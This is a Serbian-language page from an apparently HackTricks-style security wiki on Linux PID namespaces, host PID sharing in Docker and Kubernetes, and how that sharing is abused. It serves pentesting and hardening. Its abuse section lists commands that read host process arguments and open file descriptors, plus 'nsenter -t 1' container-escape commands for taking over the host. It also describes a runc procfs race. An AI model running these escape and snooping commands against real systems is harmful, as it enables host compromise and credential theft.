# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Pregled

PID namespace kontroliše kako se procesi numerišu i koji procesi su vidljivi. Zbog toga kontejner može imati svoj PID 1 iako nije stvarna mašina. Unutar namespace-a workload vidi ono što izgleda kao lokalno stablo procesa. Izvan namespace-a, host i dalje vidi stvarne host PID-ove i celokupan pejzaž procesa.

Sa bezbednosne tačke gledišta, PID namespace je važan zato što je vidljivost procesa vredna. Kada workload može da vidi host procese, može da uoči imena servisa, argumente komandne linije, tajne prosleđene kroz argumente procesa, stanje izvedeno iz okruženja preko `/proc`, i potencijalne ciljeve za ulazak u namespace. Ako može da uradi više od pukog gledanja tih procesa—na primer da šalje signale ili koristi ptrace pod odgovarajućim uslovima—problem postaje mnogo ozbiljniji.

## Operacija

Novi PID namespace počinje sa sopstvenim internim numerisanjem procesa. Prvi proces kreiran unutar njega postaje PID 1 iz ugla tog namespace-a, što takođe znači da dobija posebna init-like ponašanja za siročad i upravljanje signalima. Ovo objašnjava mnoge čudnosti u kontejnerima oko init procesa, zombie reaping-a i zašto se ponekad u kontejnerima koriste mali init wrappers.

Važna bezbednosna lekcija je da proces može delovati izolovano zato što vidi samo svoje stablo PID-ova, ali ta izolacija može biti namerno uklonjena. Docker to izlaže kroz `--pid=host`, dok Kubernetes to radi kroz `hostPID: true`. Kada kontejner uđe u host PID namespace, workload direktno vidi host procese i mnogi naredni putevi napada postaju mnogo realističniji.

## Lab

Da biste ručno kreirali PID namespace:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Sada shell vidi privatni prikaz procesa. Zastavica `--mount-proc` je važna jer montira instancu procfs koja odgovara novom PID namespace-u, čineći listu procesa koherentnom iznutra.

Za poređenje ponašanja containera:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Razlika je odmah vidljiva i laka za razumevanje, zbog čega je ovo dobar prvi lab za čitaoce.

## Upotreba u runtime okruženju

Normalni kontejneri u Docker, Podman, containerd i CRI-O dobijaju sopstveni PID namespace. Kubernetes Pods obično takođe dobijaju izolovan PID prikaz, osim ako workload eksplicitno ne zatraži host PID sharing. LXC/Incus okruženja se oslanjaju na istu kernel primitivu, iako upotrebe system-container mogu otkriti složenija stabla procesa i podstaći više prečica za debugovanje.

Isto pravilo važi svuda: ako runtime odluči da ne izoluje PID namespace, to je namerno smanjenje granica kontejnera.

## Pogrešne konfiguracije

Kanončna pogrešna konfiguracija je host PID sharing. Timovi često to opravdavaju radi debugovanja, monitoringa ili pogodnosti upravljanja servisima, ali to uvek treba tretirati kao značajnu bezbednosnu iznimku. Čak i ako kontejner nema neposrednu write primitivu nad host procesima, sama vidljivost može otkriti mnogo o sistemu. Kada se doda mogućnost poput `CAP_SYS_PTRACE` ili koristan pristup procfs, rizik se značajno povećava.

Druga greška je pretpostavka da, pošto workload po defaultu ne može da ubije ili ptrace host procese, host PID sharing je stoga bezopasan. Taj zaključak ignoriše vrednost enumeracije, dostupnost namespace-entry ciljeva i način na koji PID vidljivost kombinuje sa drugim oslabljenim kontrolama.

## Zloupotreba

Ukoliko je host PID namespace deljen, napadač može da ispita host procese, sakupi argumente procesa, identifikuje interesantne servise, pronađe kandidatske PID-ove za `nsenter`, ili kombinuje vidljivost procesa sa ptrace-povezanim privilegijama kako bi ometao host ili susedne workloads. U nekim slučajevima, samo viđenje odgovarajućeg dugotrajnog procesa je dovoljno da preoblikuje ostatak plana napada.

Prvi praktični korak je uvek da se potvrdi da li su host procesi zaista vidljivi:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Kada su host PIDs vidljivi, argumenti procesa i namespace-entry ciljevi često postaju najkorisniji izvor informacija:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Ako je `nsenter` dostupan i postoje dovoljne privilegije, proverite da li se vidljivi host process može koristiti kao namespace bridge:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Čak i kada je pristup blokiran, deljenje host PID-ova je i dalje vredno jer otkriva raspored servisa, runtime komponente i potencijalne privilegovane procese koje treba napasti sledeće.

Vidljivost host PID-ova takođe čini zloupotrebu file-descriptora realističnijom. Ako privilegovani host proces ili susedni workload ima otvoren osetljiv fajl ili socket, napadač može moći da pregleda `/proc/<pid>/fd/` i ponovo iskoristi taj deskriptor u zavisnosti od vlasništva, procfs mount opcija i modela ciljnog servisa.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Ove komande su korisne jer odgovaraju na pitanje da li `hidepid=1` ili `hidepid=2` smanjuje međuprocesnu vidljivost i da li su očigledno interesantni deskriptori, kao što su otvorene tajne datoteke, logovi ili Unix soketi, uopšte vidljivi.

### Potpun primer: host PID + `nsenter`

Deljenje host PID-a postaje direktan host escape kada proces takođe ima dovoljno privilegija da se pridruži host namespaces:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Ako naredba uspe, proces u container-u sada se izvršava u host mount-u, UTS, network, IPC i PID namespaces. Posledica je trenutna host compromise.

Čak i kada `nsenter` sam po sebi nedostaje, isti rezultat može se postići putem host binary ako je host filesystem mount-ovan:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Nedavne beleške o runtime-u

Neki napadi vezani za PID-namespace nisu tradicionalne `hostPID: true` pogrešne konfiguracije, već greške u runtime implementaciji u načinu na koji se procfs zaštite primenjuju tokom postavljanja containera.

#### `maskedPaths` race to host procfs

U ranjivim verzijama `runc`, napadači koji mogu da kontrolišu container image ili `runc exec` workload mogli su da se utrkuju sa fazom maskiranja tako što su zamenjivali container-side `/dev/null` simboličkim linkom ka osetljivom procfs putu kao što je `/proc/sys/kernel/core_pattern`. Ako bi trka uspela, masked-path bind mount bi mogao da se montira na pogrešan cilj i izloži host-global procfs kontrole novom containeru.

Korisna naredba za pregled:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Ovo je važno zato što konačni uticaj može biti isti kao kod direktnog procfs izlaganja: mogućnost pisanja u `core_pattern` ili `sysrq-trigger`, praćeno izvršavanjem koda na hostu ili denial of service.

#### Injekcija namespace-a pomoću `insject`

Alati za injekciju namespace-a poput `insject` pokazuju da interakcija sa PID-namespace ne zahteva uvek prethodno ulazak u ciljani namespace pre kreiranja procesa. Pomoćni proces može kasnije da se prikači, pozove `setns()`, i izvršava se dok zadržava vidljivost u ciljanom PID prostoru:
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Ovakva tehnika je važna pre svega za napredno otklanjanje grešaka, ofanzivne alatke i post-exploitation radne tokove gde se namespace kontekst mora pridružiti nakon što je runtime već inicijalizovao workload.

### Povezani obrasci zloupotrebe FD

Dva obrasca vredi izričito istaći kada su vidljivi host PIDs. Prvo, privilegovani proces može zadržati osetljiv file descriptor otvoren preko `execve()` zato što nije označen `O_CLOEXEC`. Drugo, servisi mogu prenositi file descriptors preko Unix sockets koristeći `SCM_RIGHTS`. U oba slučaja interesantan objekat više nije putanja, već već otvoreni handle koji proces sa nižim privilegijama može naslediti ili primiti.

Ovo je bitno u radu sa containerima jer handle može pokazivati na `docker.sock`, privilegovani log, host secret file, ili neki drugi vredan objekat čak i kada sama putanja nije direktno dostupna iz container filesystem-a.

## Provere

Svrha ovih komandi je da utvrde da li proces ima privatni PID prikaz ili da li već može da enumeriše znatno širi skup procesa.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
- Ako lista procesa sadrži očigledne host servise, host PID sharing je verovatno već omogućen.
- Uobičajeno je videti samo malo lokalno stablo kontejnera; videti `systemd`, `dockerd`, ili nepovezane daemone nije normalno.
- Kada su host PID-ovi vidljivi, čak i informacije o procesima samo za čitanje postaju korisno izviđanje.

Ako otkrijete kontejner koji radi sa host PID sharing, nemojte to smatrati kozmetičkom razlikom. To je velika promena u tome šta workload može da uoči i potencijalno utiče.
